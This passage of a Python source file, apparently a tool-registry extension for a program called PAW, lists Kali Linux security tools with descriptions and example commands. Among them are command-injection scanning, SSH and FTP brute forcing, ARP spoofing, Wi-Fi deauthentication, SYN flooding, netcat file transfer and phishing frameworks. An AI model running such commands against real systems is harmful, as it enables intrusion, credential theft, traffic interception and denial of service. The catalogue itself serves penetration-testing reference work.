            {"description": "Basic scan", "command": "skipfish -o output_dir -S /usr/share/skipfish/dictionaries/complete.wl http://example.com"},
            {"description": "Authentication", "command": "skipfish -o output_dir -A username:password http://example.com"}
        ]
    },
    {
        "name": "wafw00f",
        "category": "Web Application Analysis",
        "description": "Web Application Firewall (WAF) fingerprinting tool",
        "common_usage": "wafw00f {url}",
        "examples": [
            {"description": "Detect WAF", "command": "wafw00f http://example.com"},
            {"description": "Detect WAF with verbosity", "command": "wafw00f -v http://example.com"}
        ]
    },
    {
        "name": "commix",
        "category": "Web Application Analysis",
        "description": "Automated Command Injection exploitation tool",
        "common_usage": "commix --url {url} [options]",
        "examples": [
            {"description": "Basic scan", "command": "commix --url=\"http://example.com/vulnerable.php?id=1\""},
            {"description": "Using POST data", "command": "commix --url=\"http://example.com/vulnerable.php\" --data=\"id=1\""},
            {"description": "Cookie authentication", "command": "commix --url=\"http://example.com/vulnerable.php\" --cookie=\"PHPSESSID=r4nd0m\""}
        ]
    },
    {
        "name": "nuclei",
        "category": "Web Application Analysis",
        "description": "Fast and customizable vulnerability scanner based on templates",
        "common_usage": "nuclei -u {url} [options]",
        "examples": [
            {"description": "Basic scan", "command": "nuclei -u http://example.com"},
            {"description": "Use templates", "command": "nuclei -u http://example.com -t cves/"},
            {"description": "Scan multiple targets", "command": "nuclei -l targets.txt"},
            {"description": "Severity-based scan", "command": "nuclei -u http://example.com -severity critical,high"}
        ]
    }
])

# Wireless Security
KALI_TOOLS.extend([
    {
        "name": "kismet",
        "category": "Wireless Attacks",
        "description": "Wireless network detector, sniffer, and IDS",
        "common_usage": "kismet -c {interface}",
        "examples": [
            {"description": "Basic monitoring", "command": "kismet -c wlan0mon"},
            {"description": "Output to file", "command": "kismet -c wlan0mon -o output.pcapng"}
        ]
    },
    {
        "name": "fern-wifi-cracker",
        "category": "Wireless Attacks",
        "description": "Wireless security auditing and attack tool",
        "common_usage": "fern-wifi-cracker",
        "examples": [
            {"description": "Start GUI", "command": "fern-wifi-cracker"}
        ]
    },
    {
        "name": "mdk4",
        "category": "Wireless Attacks",
        "description": "Wi-Fi testing tool for attacking networks",
        "common_usage": "mdk4 {interface} {attack_mode} [options]",
        "examples": [
            {"description": "Beacon flood", "command": "mdk4 wlan0mon b -c 1"},
            {"description": "Deauthentication", "command": "mdk4 wlan0mon d -B 00:11:22:33:44:55"}
        ]
    },
    {
        "name": "bully",
        "category": "Wireless Attacks",
        "description": "WPS brute force attack implementation",
        "common_usage": "bully {interface} -b {BSSID} [options]",
        "examples": [
            {"description": "Basic attack", "command": "bully wlan0mon -b 00:11:22:33:44:55 -c 6"},
            {"description": "With PIN", "command": "bully wlan0mon -b 00:11:22:33:44:55 -c 6 -p 12345670"}
        ]
    }
])

# Exploitation Frameworks
KALI_TOOLS.extend([
    {
        "name": "exploit-db",
        "category": "Exploitation Tools",
        "description": "Archive of public exploits and corresponding vulnerable software",
        "common_usage": "searchsploit [options] {search_term}",
        "examples": [
            {"description": "Search exploits", "command": "searchsploit apache struts"},
            {"description": "Search by CVE", "command": "searchsploit CVE-2021-44228"}
        ]
    },
    {
        "name": "beef-xss",
        "category": "Exploitation Tools",
        "description": "Browser Exploitation Framework for XSS attacks",
        "common_usage": "beef-xss",
        "examples": [
            {"description": "Start framework", "command": "beef-xss"},
            {"description": "Custom config", "command": "beef-xss -c config.yaml"}
        ]
    },
    {
        "name": "routersploit",
        "category": "Exploitation Tools",
        "description": "Exploitation framework for embedded devices",
        "common_usage": "rsf",
        "examples": [
            {"description": "Start framework", "command": "rsf"},
            {"description": "Use module", "command": "use scanners/router_scan"}
        ]
    }
])

# Password Attacks
KALI_TOOLS.extend([
    {
        "name": "ophcrack",
        "category": "Password Attacks",
        "description": "Windows password cracker using rainbow tables",
        "common_usage": "ophcrack [options]",
        "examples": [
            {"description": "Start GUI", "command": "ophcrack"},
            {"description": "Load tables", "command": "ophcrack -d /path/to/tables -t vista_free"}
        ]
    },
    {
        "name": "cewl",
        "category": "Password Attacks",
        "description": "Custom word list generator from web content",
        "common_usage": "cewl [options] {url}",
        "examples": [
            {"description": "Basic wordlist", "command": "cewl http://example.com -m 6 -w wordlist.txt"},
            {"description": "With email extraction", "command": "cewl http://example.com -m 6 -w wordlist.txt --email"}
        ]
    },
    {
        "name": "crunch",
        "category": "Password Attacks",
        "description": "Wordlist generator that creates permutations",
        "common_usage": "crunch {min} {max} [charset] [options]",
        "examples": [
            {"description": "Basic generation", "command": "crunch 8 8 -o wordlist.txt"},
            {"description": "Custom charset", "command": "crunch 8 8 abcdefgh12345 -o wordlist.txt"},
            {"description": "Pattern-based", "command": "crunch 8 8 -t password@ -o wordlist.txt"}
        ]
    },
    {
        "name": "medusa",
        "category": "Password Attacks",
        "description": "Parallel network login auditor",
        "common_usage": "medusa -h {host} -u {user} -p {password} -M {module}",
        "examples": [
            {"description": "SSH brute force", "command": "medusa -h 192.168.1.1 -u admin -P /path/to/passwords.txt -M ssh"},
            {"description": "FTP brute force", "command": "medusa -h 192.168.1.1 -U /path/to/users.txt -P /path/to/passwords.txt -M ftp"}
        ]
    }
])

# Forensic Tools
KALI_TOOLS.extend([
    {
        "name": "ddrescue",
        "category": "Forensics",
        "description": "Data recovery tool that copies data from one file/block device to another",
        "common_usage": "ddrescue [options] {input} {output} [logfile]",
        "examples": [
            {"description": "Basic recovery", "command": "ddrescue /dev/sdb1 /dev/sdc1 logfile"},
            {"description": "With retry", "command": "ddrescue -r3 /dev/sdb1 /dev/sdc1 logfile"}
        ]
    },
    {
        "name": "exiftool",
        "category": "Forensics",
        "description": "Tool for reading, writing, and manipulating metadata in files",
        "common_usage": "exiftool [options] {files}",
        "examples": [
            {"description": "Read metadata", "command": "exiftool image.jpg"},
            {"description": "Remove all metadata", "command": "exiftool -all= image.jpg"}
        ]
    },
    {
        "name": "scalpel",
        "category": "Forensics",
        "description": "File carving and recovery tool",
        "common_usage": "scalpel {image} -o {output_dir}",
        "examples": [
            {"description": "Recover files", "command": "scalpel disk.img -o recovered"}
        ]
    },
    {
        "name": "bulk_extractor",
        "category": "Forensics",
        "description": "Tool that extracts information without parsing the file system",
        "common_usage": "bulk_extractor -o {output_dir} {input}",
        "examples": [
            {"description": "Extract data", "command": "bulk_extractor -o output disk.img"},
            {"description": "Focus on emails", "command": "bulk_extractor -e email -o output disk.img"}
        ]
    }
])

# Social Engineering
KALI_TOOLS.extend([
    {
        "name": "social-engineer-toolkit",
        "category": "Social Engineering Tools",
        "description": "Framework designed for social engineering attacks",
        "common_usage": "setoolkit",
        "examples": [
            {"description": "Start toolkit", "command": "setoolkit"},
            {"description": "Spear phishing", "command": "setoolkit > Social-Engineering Attacks > Spear-Phishing Attack Vectors"}
        ]
    },
    {
        "name": "gophish",
        "category": "Social Engineering Tools",
        "description": "Open-source phishing framework",
        "common_usage": "gophish",
        "examples": [
            {"description": "Start service", "command": "gophish"}
        ]
    }
])

# Network Security
KALI_TOOLS.extend([
    {
        "name": "macchanger",
        "category": "Sniffing & Spoofing",
        "description": "Utility for manipulating MAC addresses",
        "common_usage": "macchanger [options] {interface}",
        "examples": [
            {"description": "Show current MAC", "command": "macchanger -s eth0"},
            {"description": "Random MAC", "command": "macchanger -r eth0"},
            {"description": "Specific MAC", "command": "macchanger -m 00:11:22:33:44:55 eth0"}
        ]
    },
    {
        "name": "netcat",
        "category": "Sniffing & Spoofing",
        "description": "Networking utility for reading and writing to network connections",
        "common_usage": "nc [options] {host} {port}",
        "examples": [
            {"description": "Listen for connections", "command": "nc -lvp 4444"},
            {"description": "Connect to server", "command": "nc 192.168.1.1 80"},
            {"description": "File transfer (receiver)", "command": "nc -lvp 4444 > received_file"},
            {"description": "File transfer (sender)", "command": "nc 192.168.1.1 4444 < file_to_send"}
        ]
    },
    {
        "name": "arpspoof",
        "category": "Sniffing & Spoofing",
        "description": "Intercept network traffic using ARP spoofing",
        "common_usage": "arpspoof -i {interface} -t {target} {host}",
        "examples": [
            {"description": "Basic spoofing", "command": "arpspoof -i eth0 -t 192.168.1.10 192.168.1.1"},
            {"description": "Bidirectional", "command": "arpspoof -i eth0 -t 192.168.1.1 192.168.1.10"}
        ]
    },
    {
        "name": "hping3",
        "category": "Sniffing & Spoofing",
        "description": "Advanced packet crafting tool for TCP/IP auditing",
        "common_usage": "hping3 [options] {host}",
        "examples": [
            {"description": "SYN scan", "command": "hping3 -S 192.168.1.1 -p 80"},
            {"description": "Port scanning", "command": "hping3 -8 0-100 -S 192.168.1.1"},
            {"description": "DDoS simulation", "command": "hping3 --flood -S 192.168.1.1 -p 80"}
        ]
    }
])

# Privacy and Anonymity
KALI_TOOLS.extend([
    {
        "name": "proxychains",
        "category": "Information Gathering",
        "description": "Tool that forces specified applications to use SOCKS/HTTP proxies",
        "common_usage": "proxychains [options] {command} [arguments]",
        "examples": [
            {"description": "Basic usage", "command": "proxychains firefox"},
            {"description": "With nmap", "command": "proxychains nmap -sT -P0 192.168.1.1"}
        ]
    },
    {
        "name": "tor",
        "category": "Information Gathering",
        "description": "Anonymizing overlay network for TCP",
        "common_usage": "tor [options]",
        "examples": [
            {"description": "Start service", "command": "service tor start"},
            {"description": "Browser usage", "command": "torbrowser-launcher"}
        ]
    }
])

# Reverse Engineering
KALI_TOOLS.extend([
    {
        "name": "ghidra",
        "category": "Reverse Engineering",
        "description": "Software reverse engineering (SRE) framework",
        "common_usage": "ghidra",
        "examples": [
            {"description": "Start Ghidra", "command": "ghidra"},
            {"description": "Headless analysis", "command": "ghidra_server"}
        ]
    },
    {
        "name": "radare2",
        "category": "Reverse Engineering",
        "description": "Framework for reverse engineering and binary analysis",
        "common_usage": "r2 [options] {file}",
        "examples": [
            {"description": "Open binary", "command": "r2 binary"},
            {"description": "Debug mode", "command": "r2 -d binary"},
            {"description": "Analysis", "command": "r2 binary -A"}
        ]
    },
    {
        "name": "rizin",
        "category": "Reverse Engineering",
        "description": "Free and open source reverse engineering framework",
        "common_usage": "rizin [options] {file}",
        "examples": [
            {"description": "Open binary", "command": "rizin binary"},
            {"description": "Analysis", "command": "rizin -A binary"}
        ]
    }
])

# Privilege Escalation
KALI_TOOLS.extend([
    {
        "name": "linux-exploit-suggester",
        "category": "Post Exploitation",
        "description": "Tool suggesting Linux privilege escalation exploits",
        "common_usage": "linux-exploit-suggester.sh [options]",
        "examples": [
            {"description": "Basic scan", "command": "linux-exploit-suggester.sh"},
            {"description": "Kernel version", "command": "linux-exploit-suggester.sh -k 5.4.0"}
        ]
    },
    {
        "name": "windows-exploit-suggester",
        "category": "Post Exploitation",
        "description": "Tool suggesting Windows privilege escalation exploits",
        "common_usage": "windows-exploit-suggester.py [options]",
        "examples": [
            {"description": "With systeminfo", "command": "windows-exploit-suggester.py --database 2021-01-01-mssb.xls --systeminfo systeminfo.txt"}
        ]
    },
    {
        "name": "linPEAS",
        "category": "Post Exploitation",
        "description": "Linux Privilege Escalation Awesome Script",
        "common_usage": "linpeas.sh [options]",
        "examples": [
            {"description": "Full scan", "command": "linpeas.sh"},
            {"description": "With colors", "command": "linpeas.sh -c"}
        ]
    },
    {
        "name": "winPEAS",
        "category": "Post Exploitation",
        "description": "Windows Privilege Escalation Awesome Script",
        "common_usage": "winpeas.exe [options]",
        "examples": [
            {"description": "Full scan", "command": "winpeas.exe"},
            {"description": "Specific check", "command": "winpeas.exe cmd systeminfo"}
        ]
    }
])

# Container Security
KALI_TOOLS.extend([
    {
        "name": "amicontained",
        "category": "Post Exploitation",
        "description": "Container introspection tool",
        "common_usage": "amicontained",
        "examples": [
            {"description": "Basic check", "command": "amicontained"}
        ]
    },
    {
        "name": "docker-bench-security",
        "category": "Vulnerability Analysis",
        "description": "Docker security assessment tool",
        "common_usage": "docker-bench-security.sh [options]",
        "examples": [
            {"description": "Full audit", "command": "docker-bench-security.sh"}
        ]
    }
])

# Cloud Security
KALI_TOOLS.extend([
    {
        "name": "awscli",
        "category": "Post Exploitation",
        "description": "AWS command line interface",
        "common_usage": "aws [options] {command}",
        "examples": [
            {"description": "List S3 buckets", "command": "aws s3 ls"},
            {"description": "EC2 instances", "command": "aws ec2 describe-instances"}
        ]
    },
    {
        "name": "pacu",
        "category": "Post Exploitation",
        "description": "AWS exploitation framework",
        "common_usage": "pacu",
        "examples": [
            {"description": "Start framework", "command": "pacu"},
            {"description": "Run module", "command": "run iam__enum_users_roles_policies_groups"}
        ]
    },
    {
        "name": "s3scanner",
        "category": "Information Gathering",
        "description": "Tool for finding open S3 buckets",
        "common_usage": "s3scanner [options] {bucket}",
        "examples": [
            {"description": "Scan single bucket", "command": "s3scanner scan example-bucket"},
            {"description": "Scan from file", "command": "s3scanner scan --buckets-file buckets.txt"}
        ]
    }
])

# Network Defense
KALI_TOOLS.extend([
    {
        "name": "snort",
        "category": "Sniffing & Spoofing",
        "description": "Network intrusion detection & prevention system",
        "common_usage": "snort [options]",
        "examples": [
            {"description": "Test config", "command": "snort -T -c /etc/snort/snort.conf"},
            {"description": "Packet logging", "command": "snort -l /var/log/snort"}
        ]
    },
    {
        "name": "fail2ban",
        "category": "System Services",
        "description": "Intrusion prevention framework to block brute force attacks",
        "common_usage": "fail2ban-client [options] {command}",
        "examples": [
            {"description": "Status", "command": "fail2ban-client status"},
            {"description": "Ban IP", "command": "fail2ban-client set sshd banip 192.168.1.100"}
        ]
    }
])

# IoT Security
KALI_TOOLS.extend([
    {
        "name": "firmwalker",
        "category": "Vulnerability Analysis",
        "description": "Script for searching firmware file systems",
        "common_usage": "firmwalker.sh {firmware_directory}",
        "examples": [
            {"description": "Analyze firmware", "command": "firmwalker.sh /path/to/extracted_firmware"}
        ]
    },
    {
        "name": "baudrate",
        "category": "Hardware Hacking",
        "description": "Tool for identifying UART baud rates",
        "common_usage": "baudrate [options] {device}",
        "examples": [
            {"description": "Auto detect", "command": "baudrate /dev/ttyUSB0"}
        ]
    }
])

# Additional RF tools
KALI_TOOLS.extend([
    {
        "name": "rtl_433",
        "category": "Hardware Hacking",
        "description": "Program to decode radio transmissions from devices on 433.92 MHz",
        "common_usage": "rtl_433 [options]",
        "examples": [
            {"description": "Basic scan", "command": "rtl_433"},
            {"description": "Specific frequency", "command": "rtl_433 -f 868M"},
            {"description": "Save to file", "command": "rtl_433 -A -T 60 -f 433.92M -C si"}
        ]
    },
    {
        "name": "gqrx",
        "category": "Hardware Hacking",
        "description": "Software defined radio receiver",
        "common_usage": "gqrx [options]",
        "examples": [
            {"description": "Start GUI", "command": "gqrx"}
        ]
    },
    {
        "name": "hackrf_info",
        "category": "Hardware Hacking",
        "description": "Tool to display HackRF device information",
        "common_usage": "hackrf_info",
        "examples": [
            {"description": "Show info", "command": "hackrf_info"}
        ]
    }
])

def add_extensive_kali_tools(only_show: bool = False) -> List[Dict[str, Any]]:
    """Add extensive Kali tools to the registry."""
    global KALI_TOOLS
    try:
        if only_show:
            print(json.dumps(KALI_TOOLS, indent=2))
            return KALI_TOOLS
        
        for tool in KALI_TOOLS:
            add_tool_to_registry(
                name=tool['name'],
                category=tool['category'],
                description=tool['description'],
                common_usage=tool['common_usage'],
                examples=tool['examples']
            )
        return KALI_TOOLS
    except Exception as e:
        print(f"Error adding tools: {e}")
        return []

def export_tools(output_file: str) -> None:
    """
    Export all tools to a JSON file.
    
    Args:
        output_file: Path to the output JSON file
    """
    registry = get_tools_registry()
    
    with open(output_file, 'w') as f:
        json.dump(registry, f, indent=4)
    
    print(f"Exported {len(registry)} tools to {output_file}")

def import_tools(input_file: str, only_show: bool = False) -> List[Dict[str, Any]]:
    """Import tools from a JSON file."""
    global KALI_TOOLS
    try:
        with open(input_file, 'r') as f:
            imported_tools = json.load(f)
        
        if only_show:
            print(json.dumps(imported_tools, indent=2))
            return imported_tools
        
        # Update the global KALI_TOOLS variable
        KALI_TOOLS = imported_tools
        return imported_tools
        
    except Exception as e:
        print(f"Error importing tools: {e}")
        return []

def categorize_tools(tools: List[Dict[str, Any]]) -> Dict[str, List[Dict[str, Any]]]:
    """
    Categorize tools by their category.
    
    Args:
        tools: List of tool dictionaries
    
    Returns:
        Dictionary mapping categories to lists of tools
    """
    categories = {}
    
    for tool in tools:
        category = tool.get("category", "Uncategorized")
        if category not in categories:
            categories[category] = []
        categories[category].append(tool)
    
    return categories

def print_categorized_tools(categorized_tools: Dict[str, List[Dict[str, Any]]]) -> None:
    """
    Print tools categorized by their category.
    
    Args:
        categorized_tools: Dictionary mapping categories to lists of tools
    """
    print("\nTools by Category:")
    print("-----------------")
    
    for category, tools in sorted(categorized_tools.items()):
        print(f"\n{category} ({len(tools)} tools):")
        for tool in sorted(tools, key=lambda x: x["name"]):
            print(f"  - {tool['name']}: {tool['description']}")

def register_tools():
    """Register all Kali tools with the PAW tools registry."""
    try:
        for tool in KALI_TOOLS:
            add_tool_to_registry(
                name=tool['name'],
                category=tool['category'],
                description=tool['description'],
                common_usage=tool['common_usage'],
                examples=tool['examples']
            )
        print("Successfully registered all Kali tools with PAW.")
        return True
    except Exception as e:
        print(f"Error registering tools: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description='Kali Tools Extension for PAW')
    group = parser.add_mutually_exclusive_group()
    group.add_argument('--show', action='store_true', help='Show all available Kali tools')
    group.add_argument('--export', metavar='FILE', help='Export tools to JSON file')
    group.add_argument('--import', metavar='FILE', help='Import tools from JSON file')
    group.add_argument('--register', action='store_true', help='Register tools with PAW')
    
    args = parser.parse_args()
    
    if args.show:
        print(json.dumps(KALI_TOOLS, indent=2))
    elif args.export:
        with open(args.export, 'w') as f:
            json.dump(KALI_TOOLS, f, indent=2)
        print(f"Tools exported to {args.export}")
    elif getattr(args, 'import'):
        try:
            with open(getattr(args, 'import'), 'r') as f:
                imported_tools = json.load(f)
            global KALI_TOOLS
            KALI_TOOLS = imported_tools
            print(f"Tools imported from {getattr(args, 'import')}")
        except Exception as e:
            print(f"Error importing tools: {e}")
    elif args.register:
        if register_tools():
            sys.exit(0)
        else:
            sys.exit(1)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()

# Add functions to access tool information
def get_all_kali_tools():
    """Get all Kali tools."""
    global KALI_TOOLS
    return KALI_TOOLS

def get_tool_categories():
    """Get all tool categories."""
    global KALI_TOOLS
    return list(set(tool['category'] for tool in KALI_TOOLS))

def get_tools_by_category(category):
    """Get tools by category."""
    global KALI_TOOLS
    return [tool for tool in KALI_TOOLS if tool["category"].lower() == category.lower()]

def get_tool_info(tool_name):
    """
    Get detailed information about a specific tool.
    
    Args:
        tool_name: The name of the tool to retrieve
        
    Returns:
        Dictionary containing tool information or None if not found
    """
    for tool in KALI_TOOLS:
        if tool["name"].lower() == tool_name.lower():
            return tool
    return None

def search_tools(query):
    """
    Search for tools by name, category, or description.
    
    Args:
        query: The search query string
        
    Returns:
        List of matching tools
    """
    query = query.lower()
    results = []
    
    for tool in KALI_TOOLS:
        if (query in tool["name"].lower() or 
            query in tool["category"].lower() or 
            query in tool["description"].lower()):
            results.append(tool)
            
    return results

if __name__ == "__main__":
    main() 